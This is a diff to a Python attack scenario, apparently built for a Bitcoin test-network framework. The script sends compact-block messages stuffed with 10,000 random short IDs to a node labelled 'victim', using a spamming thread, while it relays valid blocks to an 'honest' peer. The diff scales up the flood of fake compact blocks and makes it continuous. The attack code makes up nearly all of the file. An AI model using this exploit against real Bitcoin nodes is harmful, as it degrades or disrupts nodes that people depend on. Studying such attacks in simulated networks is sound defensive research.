@@ -5,16 +5,19 @@ from pprint import (
 )
 
 import random
+import threading
 import socket
 from datetime import (
     datetime,
     timedelta,
 )
+import time
 
 from commander import Commander
 
 from test_framework.test_framework import BitcoinTestFramework
 from test_framework.blocktools import (
+    add_witness_commitment,
     create_block,
     create_coinbase,
     NORMAL_GBT_REQUEST_PARAMS
@@ -72,12 +75,14 @@ class CmpctAtk(Commander):
     def build_block_on_tip(self, node):
         if self.wallet.get_balance() == 0:
             print("Generating 101 blocks to the miner address for funding.")
-            self.generatetoaddress(node, 101, self.wallet.get_address(), sync_fun=self.no_op)
+            self.generatetoaddress(node, 111, self.wallet.get_address(), sync_fun=self.no_op)
+            self.wallet.rescan_utxos()
             assert (self.wallet.get_balance() > 0)
 
         txlist = [self.wallet.create_self_transfer()['tx']]
 
         block = create_block(tmpl=self.nodes[0].getblocktemplate(NORMAL_GBT_REQUEST_PARAMS), txlist=txlist)
+        add_witness_commitment(block)
         block.solve()
         return block
 
@@ -85,75 +90,87 @@ class CmpctAtk(Commander):
         cmpct_block = HeaderAndShortIDs()
         cmpct_block.header = CBlockHeader(block)
 
-        for i in range(1_000):
+        for i in range(10_000):
             shortid = int.from_bytes(random.randbytes(6), byteorder='little')
             cmpct_block.shortids.append(shortid)
 
         return cmpct_block
 
-    def check_getdata_received_for_hash(self, conn, hash):
-        """Waits for a getdata message.
+    def peer_requested_hash(self, conn, hash):
+        """Checks if any getdata message contains a given hash."""
 
-        The object hashes in the inventory vector must match the provided hash_list."""
-        last_data = self.last_message.get("getdata")
+        last_data = conn.last_message.get("getdata")
         if not last_data:
             return False
-        return [x.hash for x in last_data.inv] == hash_list
+        for item in last_data.inv:
+            pp(item.hash)
+            pp(hash)
+            if item.hash == hash:
+                return True
+
+        return False
+        # return any(x.hash == hash for x in last_data.inv)
 
     def run_test(self):
         attacker = self.tanks['miner']
-        victim = "tank1"
-        honest = "tank2"
+        victim = "victim"
+        honest = "honest"
 
         # Set-up, to get some funds in the wallet.
         honestpeer = self.connect_to_hostname(honest)
 
         self.wallet = MiniWallet(attacker)
+        self.log.info("Creating funding block.")
         funding_block = self.build_block_on_tip(attacker)
-        honestpeer.send_and_ping(msg_headers([CBlockHeader(funding_block)]))
-        honestpeer.wait_for_getdata(funding_block.hash)
+        self.log.info("Sending funding block header to honest peer.")
+        honestpeer.send_message(msg_headers([CBlockHeader(funding_block)]))
+        honestpeer.wait_for_getdata([funding_block.sha256], timeout=5)
         honestpeer.send_and_ping(msg_block(funding_block))
 
-        # Now we will use a python-based Bitcoin p2p node to send very specific,
-        # unusual or non-standard messages to a "victim" node.
         self.log.info(f"Attacking {victim}")
         attackers = []
-        for i in range(3):
+        for _ in range(3):
             attackers.append(self.connect_to_hostname(victim))
 
+        attack_stop_event = None
+        attack_thread = None
         next_block_interrupt_time = None
         honestpeer_received = False
-        victim_received = False
         while True:
             now = datetime.now()
-            if next_block_interrupt_time is None or (victim_received and honestpeer_received and now > next_block_interrupt_time):
+            if next_block_interrupt_time is None or (honestpeer_received and now > next_block_interrupt_time):
+                # When creating new block (at the top of the timeout condition):
+                if attack_thread and attack_thread.is_alive():
+                    self.log.info("Killing existing attack thread.")
+                    # signal the spam thread to stop and wait shortly for it to exit
+                    assert(attack_stop_event is not None)
+                    attack_stop_event.set()
+                    attack_thread.join(timeout=1.0)
+
                 print("Timeout reached, refreshing attack block.")
                 real_block = self.build_block_on_tip(attacker)
                 attack_block = self.build_fat_empty_cmpct(real_block)
                 attack_block_msg = msg_cmpctblock(attack_block.to_p2p())
                 next_block_interrupt_time = datetime.now() + timedelta(seconds=15)
                 honestpeer_received = False
-                victim_received = False
 
-            if not victim_received:
-                for victim_conn in attackers:
-                    victim_conn.send_message(attack_block_msg)
-                victim_received = True
-
-            honestpeer_getdata = honestpeer.last_message.get("getdata")
+            if not attack_thread:
+                def spam(stop_event):
+                    while not stop_event.is_set():
+                        for conn in attackers:
+                            conn.send_message(attack_block_msg)
+                attack_stop_event = threading.Event()
+                attack_thread = threading.Thread(target=spam, args=(attack_stop_event,), daemon=True)
+                attack_thread.start()
 
             # If the honest peer has not already received the block, and has
             # requested the block after receiving the header from us: send the block.
-            if not honestpeer_received and next_block_interrupt_time - now > timedelta(seconds=10):
-                if honestpeer_getdata is not None:
-                    honestpeer.send_and_ping(msg_block(real_block))
-                    honestpeer_received = True
-                    print(f"Honest peer sent us a getdata for {real_block.hash} and we responded.")
-                else:  # Otherwise send the header.
-                    headers_message = msg_headers()
-                    headers_message.headers = [CBlockHeader(real_block)]
-                    honestpeer.send_message(headers_message)
-
+            if not honestpeer_received:
+                honestpeer.send_message(msg_headers([CBlockHeader(real_block)]))
+                honestpeer.wait_for_getdata([real_block.sha256], timeout=5)
+                honestpeer.send_and_ping(msg_block(real_block))
+                honestpeer_received = True
+                self.log.info(f"Honest peer sent us a getdata for {real_block.sha256} and we responded.")
 
 def main():
     CmpctAtk().main()
